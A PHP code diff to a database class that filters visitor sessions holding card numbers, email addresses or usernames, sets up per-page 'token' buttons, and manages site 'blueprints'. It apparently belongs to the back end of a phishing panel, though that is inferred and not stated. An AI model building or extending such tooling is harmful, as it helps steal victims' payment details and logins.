@@ -367,15 +367,18 @@ class DB {
         }
 
         $query=$query."WHERE (Last_Online > ($time - $period)  OR Last_Online IS NULL) ";
-        
+        $hasinput="cardnumber IS NOT NULL ".
+            "OR email_address IS NOT NULL OR username IS NOT NULL";
+        if(!$filter){
+            $query=$query."AND (Last_Online > $time - 30 OR $hasinput)";
+        }
         if($filter=="inputs" || $filter=="recent"){
-            $query=$query."AND (cardnumber IS NOT NULL ".
-            "OR email_address IS NOT NULL OR username IS NOT NULL)";
+            $query=$query."AND ($hasinput)";
         }
         if($filter=="bookmarked"){
             $query=$query."AND bookmark = TRUE ";
         }
-        $query = $query . " ORDER BY date_visited DESC";
+        $query = $query . " ORDER BY Last_Online DESC";
         $statement = $conn->prepare($query);
         $statement->execute();
         $queryresult=$statement->get_result();
@@ -387,7 +390,7 @@ class DB {
     }
 
     public static function checkPageTableExists($conn,$nodeName){
-        $query = $conn->prepare("SHOW TABLES FROM $nodeName LIKE 'pages'");
+        $query = $conn->prepare("SHOW TABLES FROM `$nodeName` LIKE 'pages'");
         $query->execute();
         $result=$query->get_result();
         if($result->num_rows>0){
@@ -397,14 +400,14 @@ class DB {
     }
     
     public static function getSession($conn,$nodeName,$sessionId,$getpages){
-        $query = null;
+        $sql = null;
         if($getpages){
-            $query = $conn->prepare("select * from logs INNER JOIN $nodeName.pages ON pages.pageID = logs.pageID where SessionID=?");
+            $sql = "select * from logs INNER JOIN `$nodeName`.pages ON pages.pageID = logs.pageID AND SessionID=?";
         }
         else{
-            $query = $conn->prepare("select * from logs where SessionID=?");
+            $sql = "select * from logs where SessionID=?";
         } 
-        
+        $query=$conn->prepare($sql);
         $query->bind_param("s",$sessionId);
         $query->execute();
         $queryresult=$query->get_result();
@@ -436,7 +439,7 @@ class DB {
     }
 
     public static function getOptions($conn,$nodeName,$pageId){
-        $query = $conn->prepare("select tokenButtonName,tokenButtonType,tokenName,isMainRow,SendTokenWithError FROM $nodeName.tokensetup where pageID=? AND tokenButtonName IS NOT NULL");
+        $query = $conn->prepare("select tokenButtonName,tokenButtonType,tokenName,isMainRow,SendTokenWithError FROM `$nodeName`.tokensetup where pageID=? AND tokenButtonName IS NOT NULL");
         $query->bind_param("s",$pageId);
         $query->execute();
         $queryresult=$query->get_result();
@@ -733,6 +736,45 @@ class DB {
             return $result;
         }
         return false;
+    }
+
+    public static function getBlueprints($conn) {
+        $query = $conn->prepare("SELECT * from blueprints");
+        $query->execute();
+        $queryresult=$query->get_result();
+        if($queryresult){
+            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
+            return $result;
+        }
+        return false;
+    }
+
+    public static function getBlueprint($conn, $blueprint_name) {
+        $query = $conn->prepare("SELECT * FROM `blueprints` where blueprint=?");
+        $query->bind_param("s", $blueprint_name);
+        $query->execute();
+        $queryresult=$query->get_result();
+        if($queryresult){
+            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
+            return $result;
+        }
+        return false;
+    }
+
+    public static function deleteBlueprint($conn, $blueprint_name) {
+        $query = $conn->prepare("DELETE FROM `blueprints` where blueprint=?");
+        $query->bind_param("s", $blueprint_name);
+        $status = $query->execute();
+        return $status;
+    }
+
+    public static function insertBlueprint($conn, $blueprint, $assetDir, $engine) {
+        $query = $conn->prepare(
+            "INSERT INTO blueprints ".
+            "VALUES (?, ?, ?)");
+        $query->bind_param("sss", $blueprint, $assetDir, $engine);
+        $status = $query->execute();
+        return $status;
     }
 }
 ?>
